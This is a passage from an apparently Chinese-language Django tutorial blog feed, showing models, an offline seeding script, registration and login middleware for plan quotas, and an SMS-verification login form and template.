class="string">"项目数"</span>)</span><br><span class="line">    project_member = models.PositiveIntegerField(verbose_name=<span class="string">"项目成员数"</span>)</span><br><span class="line">    project_space = models.PositiveIntegerField(verbose_name=<span class="string">"项目空间"</span>)</span><br><span class="line">    per_file_size = models.PositiveIntegerField(verbose_name=<span class="string">"单文件大小（M）"</span>)</span><br><span class="line"></span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'创建时间'</span>, auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transaction</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""交易记录"""</span></span><br><span class="line">    status_choice = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'未支付'</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">'已支付'</span>),</span><br><span class="line">    )</span><br><span class="line">    status = models.SmallIntegerField(verbose_name=<span class="string">'状态'</span>, choices=status_choice)</span><br><span class="line"></span><br><span class="line">    order = models.CharField(verbose_name=<span class="string">'订单号'</span>, max_length=<span class="number">64</span>, unique=<span class="literal">True</span>)    <span class="comment"># unique唯一索引</span></span><br><span class="line">    user = models.ForeignKey(verbose_name=<span class="string">'用户'</span>, to=<span class="string">'UserInfo'</span>)</span><br><span class="line">    price_policy = models.ForeignKey(verbose_name=<span class="string">'价格策略'</span>, to=<span class="string">'PricePolicy'</span>)</span><br><span class="line"></span><br><span class="line">    count = models.IntegerField(verbose_name=<span class="string">'数量（年）'</span>, help_text=<span class="string">'0表示无限期'</span>)</span><br><span class="line"></span><br><span class="line">    price = models.IntegerField(verbose_name=<span class="string">'实际支付价格'</span>)</span><br><span class="line"></span><br><span class="line">    start_datetime = models.DateTimeField(verbose_name=<span class="string">'开始时间'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    end_datetime = models.DateTimeField(verbose_name=<span class="string">'结束时间'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'创建时间'</span>, auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Project</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""项目表"""</span></span><br><span class="line">    COLOR_CHOICES = (</span><br><span class="line">        (<span class="number">1</span>,<span class="string">'#56b8eb'</span>),</span><br><span class="line">        (<span class="number">2</span>,<span class="string">'#f28033'</span>),</span><br><span class="line">        (<span class="number">3</span>,<span class="string">'#ebc656'</span>),</span><br><span class="line">        (<span class="number">4</span>,<span class="string">'#a2d148'</span>),</span><br><span class="line">        (<span class="number">5</span>,<span class="string">'#20BFA4'</span>),</span><br><span class="line">        (<span class="number">6</span>,<span class="string">'#7461c2'</span>),</span><br><span class="line">        (<span class="number">7</span>,<span class="string">'#20bfa3'</span>),</span><br><span class="line">    )</span><br><span class="line">    name = models.CharField(verbose_name=<span class="string">'项目名称'</span>,max_length=<span class="number">32</span>)</span><br><span class="line">    color = models.SmallIntegerField(verbose_name=<span class="string">'颜色'</span>,choices=COLOR_CHOICES, default=<span class="number">1</span>)</span><br><span class="line">    desc = models.CharField(verbose_name=<span class="string">'项目描述'</span>,max_length=<span class="number">255</span>,null=<span class="literal">True</span>,blank=<span class="literal">True</span>)</span><br><span class="line">    use_space = models.IntegerField(verbose_name=<span class="string">'项目已使用的空间'</span>,default=<span class="number">0</span>)</span><br><span class="line">    star = models.BooleanField(verbose_name=<span class="string">'星标'</span>,default=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    join_count = models.SmallIntegerField(verbose_name=<span class="string">'参与人数'</span>,default=<span class="number">1</span>)</span><br><span class="line">    creator = models.ForeignKey(verbose_name=<span class="string">'创建者'</span>,to=<span class="string">'UserInfo'</span>)</span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'创建时间'</span>,auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProjectUser</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">"""项目参与者"""</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">'项目'</span>, to=<span class="string">'Project'</span>)</span><br><span class="line">    user = models.ForeignKey(verbose_name=<span class="string">'参与者'</span>,to=<span class="string">'UserInfo'</span>)</span><br><span class="line">    star = models.BooleanField(verbose_name=<span class="string">'星标'</span>,default=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'加入时间'</span>,auto_now_add=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="7-2-离线脚本创建价格策略【免费版】"><a href="#7-2-离线脚本创建价格策略【免费版】" class="headerlink" title="7.2 离线脚本创建价格策略【免费版】"></a>7.2 离线脚本创建价格策略【免费版】</h3><p><img src="/" class="lazyload" data-src="G:%5C360MoveData%5CUsers%5CShinelon%5CDesktop%5Cenvs%5C%E7%AC%94%E8%AE%B0%5C%E4%BB%B7%E6%A0%BC%E7%AD%96%E7%95%A5.jpg"  alt="价格策略"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取s28的路径，os.path.abspath(__file__)当前脚本的路径，os.path.dirname当前路径的上一路经</span></span><br><span class="line">base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"><span class="comment"># 把s28的路径写到sys.path才能导入环境变量</span></span><br><span class="line">sys.path.append(base_dir)</span><br><span class="line"><span class="comment"># 把s28.settings写入DJANGO_SETTINGS_MODULE环境变量中，os.environ就是环境变量</span></span><br><span class="line">os.environ.setdefault(<span class="string">"DJANGO_SETTINGS_MODULE"</span>,<span class="string">"s28.settings"</span>)</span><br><span class="line"><span class="comment"># 模拟运行manage.py,让django启动（不是真正意义上的启动）</span></span><br><span class="line">django.setup()  <span class="comment"># 读取os.environ['DJANGO_SETTINGS_MODULE']这个环境变量，导入s28.settings的路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    exists = models.PricePolicy.objects.filter(category=<span class="number">1</span>,title=<span class="string">"个人免费版"</span>).exists()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">        models.PricePolicy.objects.create(</span><br><span class="line">            category=<span class="number">1</span>,</span><br><span class="line">            title=<span class="string">"个人免费版"</span>,</span><br><span class="line">            price=<span class="number">0</span>,</span><br><span class="line">            project_num=<span class="number">3</span>,</span><br><span class="line">            project_member=<span class="number">2</span>,</span><br><span class="line">            project_space=<span class="number">20</span>,</span><br><span class="line">            per_file_size=<span class="number">5</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><h3 id="7-3-修改用户注册，为新用户添加交易记录【免费版】"><a href="#7-3-修改用户注册，为新用户添加交易记录【免费版】" class="headerlink" title="7.3 修改用户注册，为新用户添加交易记录【免费版】"></a>7.3 修改用户注册，为新用户添加交易记录【免费版】</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""注册"""</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form = RegisterForm()</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'web/register.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取POST的数据</span></span><br><span class="line">    form = RegisterForm(request.POST)</span><br><span class="line">    <span class="comment"># 对数据进行校验</span></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 验证通过写入数据库（密码为密文）</span></span><br><span class="line">        <span class="comment"># instance = form.save,在数库中新增一条数据，并将新增的数据复制给instance</span></span><br><span class="line">        <span class="comment">#用户表中新建一条数据（注册）</span></span><br><span class="line">        instance = form.save()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 价格策略</span></span><br><span class="line">        policy_object = models.PricePolicy.objects.filter(category=<span class="number">1</span>,title=<span class="string">"个人免费版"</span>).first()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#创建交易记录</span></span><br><span class="line">        <span class="comment"># 方式一</span></span><br><span class="line">        <span class="keyword">import</span> uuid</span><br><span class="line">        models.Transaction.objects.create(</span><br><span class="line">            status=<span class="number">2</span>,</span><br><span class="line">            order=str(uuid.uuid4()),    <span class="comment"># 随机生成的字符串</span></span><br><span class="line">            user = instance,</span><br><span class="line">            price_policy=policy_object,</span><br><span class="line">            count=<span class="number">0</span>,</span><br><span class="line">            price=<span class="number">0</span>,</span><br><span class="line">            start_datetime=datetime.datetime.now(),</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 方式二，不书写，中间件执行</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: <span class="string">'/login/'</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h3 id="7-4-登陆中间件修改，加入用户的交易记录"><a href="#7-4-登陆中间件修改，加入用户的交易记录" class="headerlink" title="7.4 登陆中间件修改，加入用户的交易记录"></a>7.4 登陆中间件修改，加入用户的交易记录</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tracer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.user = <span class="literal">None</span></span><br><span class="line">        self.price_policy = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span><span class="params">(MiddlewareMixin)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line"></span><br><span class="line">        request.tracer = Tracer()</span><br><span class="line"></span><br><span class="line">        <span class="string">"""用户已登陆，则request中赋值"""</span></span><br><span class="line">        user_id = request.session.get(<span class="string">'user_id'</span>, <span class="number">0</span>)</span><br><span class="line">        user_obj = models.UserInfo.objects.filter(id=user_id).first()</span><br><span class="line">        request.tracer.user = user_obj</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 白名单：没有登陆可以访问的页面</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        1. 获取当前用户访问的URL</span></span><br><span class="line"><span class="string">        2. 检查URL是否在白名单中，如果不在，判断是否登录，没有登陆跳转到登录页面             </span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> request.path_info <span class="keyword">in</span> settings.WHITE_REGEX_URL_LIST:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 检测用户是否登录，已登录继续往下执行，为登陆返回登陆页面</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.tracer.user:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">'login'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取当前用户的额度</span></span><br><span class="line">        <span class="comment"># 方式一：免费额度在交易记录中存储</span></span><br><span class="line">        <span class="comment"># 获取当前用户ID值最大（最近的交易记录）</span></span><br><span class="line">        _object = models.Transaction.objects.filter(user=user_obj, status=<span class="number">2</span>).order_by(<span class="string">'-id'</span>).first()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断是否已过期</span></span><br><span class="line">        current_datetime = datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> _object.end_datetime <span class="keyword">and</span> _object.end_datetime &lt; current_datetime:</span><br><span class="line">            _object = models.Transaction.objects.filter(user=user_obj, status=<span class="number">2</span>, price_policy__category=<span class="number">1</span>).first()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当前用户的额度信息</span></span><br><span class="line">        request.tracer.price_policy = _object.price_policy </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 方式二：免费额度存储配置文件</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        # 获取当前用户ID值最大（最近的交易记录）</span></span><br><span class="line"><span class="string">        _object = models.Transaction.objects.first(user=user_obj, status=2).order_by('-id').first()</span></span><br><span class="line"><span class="string">        if not _object:</span></span><br><span class="line"><span class="string">            # 没有购买</span></span><br><span class="line"><span class="string">            request.price_policy = models.PricePolicy.objects.filter(category=1, title='个人免费版').first()</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            # 付费版</span></span><br><span class="line"><span class="string">            current_datetime = datetime.datetime.now()</span></span><br><span class="line"><span class="string">            if _object.end_datetime and _object.end_datetime &lt; current_datetime:</span></span><br><span class="line"><span class="string">                # 过期</span></span><br><span class="line"><span class="string">                request.price_policy = models.PricePolicy.objects.filter(category=1, title='个人免费版').first()</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                request.price_policy = _object.price_policy</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 业务探讨 </category>
          
          <category> 任务 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django离线脚本</title>
      <link href="/2020/08/02/5%20Django%E7%A6%BB%E7%BA%BF%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/08/02/5%20Django%E7%A6%BB%E7%BA%BF%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="5-Django离线脚本"><a href="#5-Django离线脚本" class="headerlink" title="5 Django离线脚本"></a>5 Django离线脚本</h2><p>Django离线脚本就是通过脚本代码对Django项目做一些处理。</p><p>可直接 运行，不需启动Django程序。</p><p>一般使用到的地方：数据库录入全省市县，敏感字、词语等</p><h3 id="例子1：使用离线脚本在用户表中插入数据"><a href="#例子1：使用离线脚本在用户表中插入数据" class="headerlink" title="例子1：使用离线脚本在用户表中插入数据"></a>例子1：使用离线脚本在用户表中插入数据</h3><p>在项目目录下创建<code>scripts文件夹</code>存放django的离线脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取s28的路径，os.path.abspath(__file__)当前脚本的路径，os.path.dirname当前路径的上一路经</span></span><br><span class="line">base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把s28的路径写到sys.path才能导入环境变量</span></span><br><span class="line">sys.path.append(base_dir)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把s28.settings写入DJANGO_SETTINGS_MODULE环境变量中，os.environ就是环境变量</span></span><br><span class="line">os.environ.setdefault(<span class="string">"DJANGO_SETTINGS_MODULE"</span>,<span class="string">"s28.settings"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟运行manage.py,让django启动（不是真正意义上的启动）</span></span><br><span class="line"><span class="comment"># 读取os.environ['DJANGO_SETTINGS_MODULE']这个环境变量，导入s28.settings的路径</span></span><br><span class="line">django.setup() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 往数据库添加数据：连接数据库、操作、关闭数据库</span></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line">models.UserInfo.objects.create(username=<span class="string">'sj'</span>,email=<span class="string">'mzxsj@qq.com'</span>,mobile_phone=<span class="number">13400013000</span>,password=<span class="number">12345678</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Django离线脚本 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实现登陆功能 &amp; 退出登录</title>
      <link href="/2020/08/02/2%20%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD/"/>
      <url>/2020/08/02/2%20%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="2-实现登陆功能"><a href="#2-实现登陆功能" class="headerlink" title="2 实现登陆功能"></a>2 实现登陆功能</h2><h3 id="2-1-短信登陆"><a href="#2-1-短信登陆" class="headerlink" title="2.1 短信登陆"></a>2.1 短信登陆</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/sms%E7%9F%AD%E4%BF%A1%E7%99%BB%E9%99%86.jpg"  alt="sms短信登陆"></p><h4 id="2-1-1构造url路径"><a href="#2-1-1构造url路径" class="headerlink" title="2.1.1构造url路径"></a>2.1.1构造url路径</h4><p>在urls.py文件下构造短信登录路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^login/sms/$'</span>, account.login_sms, name=<span class="string">'login_sms'</span>),</span><br></pre></td></tr></table></figure><h4 id="2-1-2页面展示"><a href="#2-1-2页面展示" class="headerlink" title="2.1.2页面展示"></a>2.1.2页面展示</h4><ul><li>通过form表单生成</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginSmsForm</span><span class="params">(BootSrtapForm,forms.Form)</span>:</span></span><br><span class="line">    <span class="comment"># RegexValidator 接收两个信息，正则表达式，错误提示信息</span></span><br><span class="line">    mobile_phone = forms.CharField(label=<span class="string">'手机号'</span>, validators=[RegexValidator(<span class="string">r'^1[3-9]\d&#123;9&#125;$'</span>, <span class="string">'手机号格式不正确'</span>), ])</span><br><span class="line"></span><br><span class="line">    code = forms.CharField(label=<span class="string">'验证码'</span>, widget=forms.TextInput())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_mobile_phone</span><span class="params">(self)</span>:</span></span><br><span class="line">        mobile_phone = self.cleaned_data[<span class="string">'mobile_phone'</span>]</span><br><span class="line">        <span class="comment"># user_obj = models.UserInfo.objects.filter(mobile_phone=mobile_phone).first()</span></span><br><span class="line">        exists = models.UserInfo.objects.filter(mobile_phone=mobile_phone).exists()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'手机号不存在'</span>)</span><br><span class="line">        <span class="keyword">return</span> mobile_phone</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        code = self.cleaned_data[<span class="string">'code'</span>]</span><br><span class="line">        mobile_phone = self.cleaned_data.get(<span class="string">'mobile_phone'</span>)</span><br><span class="line">        <span class="comment"># 手机号不存在验证码无需校验</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mobile_phone:</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">        conn = get_redis_connection()</span><br><span class="line">        redis_code = conn.get(mobile_phone)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> redis_code:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'验证码失效或未发送，请重新发送'</span>)</span><br><span class="line">        redis_str_code = redis_code.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> code.strip() != redis_str_code:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'验证码输入错误，请重新输入'</span>)</span><br><span class="line">        <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><ul><li>短信登陆的视图函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_sms</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""短信登陆"""</span></span><br><span class="line">    form = LoginSmsForm()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'web/login_sms.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><ul><li><code>login_sms.html</code>模板</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/basic.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/account.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-msg</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">            position: absolute; &#123;# 绝对定位 #&#125;</span><br><span class="line">            font-size: 13px;    &#123;# 字体大小 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    用户短信登陆</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"account"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>短信登陆<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"smsForm"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            &#123;% for field in form %&#125;</span><br><span class="line">                &#123;% if field.name == 'code' %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-7"</span>&gt;</span></span><br><span class="line">                                &#123;&#123; field 